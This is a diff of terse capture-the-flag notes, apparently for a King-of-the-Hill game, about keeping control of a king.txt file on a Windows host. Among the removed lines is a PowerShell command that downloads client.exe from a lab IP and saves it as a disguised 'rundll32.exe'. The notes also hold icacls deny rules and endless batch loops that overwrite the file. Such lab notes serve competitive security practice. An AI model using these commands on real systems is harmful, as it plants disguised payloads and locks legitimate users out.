@@ -1,33 +1,16 @@
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/client.exe','c:\users\administrator\music\rundll32.exe')"
-CMD
-attrib +R king.txt  # Basic read-only (admins can bypass)
-icacls "C:\Users\Administrator\king-serve\king.txt" /deny *S-1-1-0:(W)  # Stronger (blocks everyone)
-attrib +r king.txt
-
-
-attrib +R king.txt  # Basic read-only (admins can bypass)
-icacls "C:\king.txt" /deny *S-1-1-0:(W)  # Stronger (blocks everyone)
-attrib +r king.txt
------------------
-@echo off
-:x
-attrib -a -s -r -i C:\king.txt&echo doc730 > C:\king.txt&attrib +a +s +r +i C:\king.txt
-goto x
 -----------------
 powershell
-$file = [System.IO.File]::Open("C:\king.txt", 'Open', 'Read', 'None')
+$file = [System.IO.File]::Open("C:\kingpath", 'Open', 'Read', 'Read')
 
-$file = [System.IO.File]::Open("C:\Users\Administrator\king.txt", 'Open', 'Read', 'None')
-
-
-For a chattr loop like thing, use:
+-----------------
+loops
 
 :loop
-attrib -r -a -h -s c:\king.txt
-echo Aquinas > c:\king.txt
+attrib -r -a -h -s C:\kingpath
+echo Aquinas > C:\kingpath
 goto loop
 
 :loop
-attrib -r -a -h -s c:\king.txt
+attrib -r -a -h -s C:\kingpath
 echo doc730 > c:\king.txt
 goto loop
